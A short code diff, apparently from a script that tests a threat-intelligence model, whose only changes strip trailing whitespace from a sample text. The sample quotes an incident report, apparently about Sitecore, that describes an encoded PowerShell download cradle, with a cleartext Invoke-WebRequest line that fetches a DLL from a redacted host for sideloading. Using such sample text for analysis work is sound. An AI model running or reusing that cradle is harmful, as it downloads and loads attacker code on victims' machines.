@@ -58,10 +58,10 @@ def main():
         # Test the model
         logger.info("Testing model with sample content...")
         test_content = """
-        Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: 
-        Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== 
+        Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique:
+        Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD==
         Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll
-        
+
         Acknowledgement We would like to extend our gratitude to the Sitecore team for their support throughout this investigation.
         """
 
